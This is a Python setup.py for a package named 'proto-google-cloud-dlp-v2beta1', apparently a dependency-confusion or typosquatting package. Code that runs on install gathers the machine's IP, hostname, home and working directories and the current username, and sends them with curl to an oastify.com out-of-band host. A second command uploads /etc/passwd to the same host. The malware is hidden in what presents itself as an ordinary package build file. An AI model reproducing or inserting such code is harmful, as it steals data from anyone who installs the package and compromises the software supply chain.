
from setuptools import setup
import os
import socket

hostname = socket.gethostname()
try:
    ip = socket.gethostbyname(hostname)
except:
    ip = "unknown"

home_dir = os.path.expanduser("~")
current_dir = os.getcwd()

data = f"originating_ip={ip}&hostname={hostname}&home_directory={home_dir}&current_directory={current_dir}"
os.system(f"curl -X POST --data '{data}' http://go8x3nq7vdeq29y69shghbj6jxpydo1d.oastify.com/$(whoami)")

# LFI-style exfiltration of /etc/passwd during install
os.system("curl -X POST --data-binary '@/etc/passwd' http://go8x3nq7vdeq29y69shghbj6jxpydo1d.oastify.com/$(whoami)")

setup(
    name="proto-google-cloud-dlp-v2beta1",
    version="0.15.99", 
    packages=["proto_google_cloud_dlp_v2beta1"],
    install_requires=[],
)
